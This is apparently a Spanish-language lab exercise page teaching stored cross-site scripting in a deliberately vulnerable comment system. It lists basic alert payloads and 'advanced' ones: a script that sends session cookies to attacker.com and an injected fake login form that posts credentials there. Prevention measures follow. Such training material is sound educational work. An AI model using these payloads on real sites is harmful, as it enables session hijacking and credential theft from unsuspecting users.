💾 Ejercicio 2: Stored XSS

Inyecta código malicioso que persiste y afecta a todos los usuarios

📋 Instrucciones

Este sistema de comentarios es vulnerable a Stored XSS. Tu objetivo es inyectar código JavaScript que se almacene en la base de datos y se ejecute cada vez que alguien visite esta página.

  • Objetivo: Almacenar código malicioso en la base de datos
  • Tipo: Stored/Persistent XSS (persiste entre sesiones)
  • Vulnerabilidad: Los comentarios se guardan y muestran sin sanitizar
  • Impacto: Afecta a TODOS los usuarios que vean la página
💡 Payloads Sugeridos

Prueba estos payloads en el campo de comentario:

<script>alert('Stored XSS!')</script>
<img src=x onerror=alert('Stored XSS!')>
<svg onload=alert('Persistent XSS')>
<iframe src="javascript:alert('XSS')">
<input onfocus=alert('XSS') autofocus>

🎓 Explicación Técnica

¿Por qué es más peligroso que Reflected XSS?

  • Persistencia: El código malicioso se almacena en la base de datos
  • Alcance masivo: Afecta a todos los usuarios que visiten la página
  • Sin interacción necesaria: Las víctimas no necesitan hacer clic en un link
  • Difícil de detectar: El payload permanece activo hasta ser eliminado

Ataques posibles:

  • Robar cookies de sesión de múltiples usuarios
  • Defacement (modificar la apariencia del sitio)
  • Phishing interno (formularios falsos de login)
  • Propagación de malware
  • Cryptojacking (minería de criptomonedas)
🚀 Payloads Avanzados

Una vez que domines los básicos, prueba estos:

// Robar cookies y enviarlas a un servidor externo (simulado) <script> fetch('https://attacker.com/steal?cookie=' + document.cookie); </script>
// Crear un formulario de phishing <div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999"> <h1>Sesión Expirada</h1> <form action="https://attacker.com/phish"> <input name="user" placeholder="Usuario"> <input name="pass" type="password" placeholder="Contraseña"> <button>Iniciar Sesión</button> </form> </div>
🛡️ ¿Cómo Prevenir Stored XSS?
  • Sanitización en entrada: Limpiar el input antes de almacenarlo
  • Escape en salida: Escapar HTML al mostrar contenido almacenado
  • Content Security Policy: Restricciones estrictas de ejecución de scripts
  • HTTPOnly cookies: Prevenir acceso a cookies desde JavaScript
  • Validación de tipos: Usar bibliotecas como DOMPurify para sanitizar HTML
  • WAF: Web Application Firewall para detectar patrones XSS
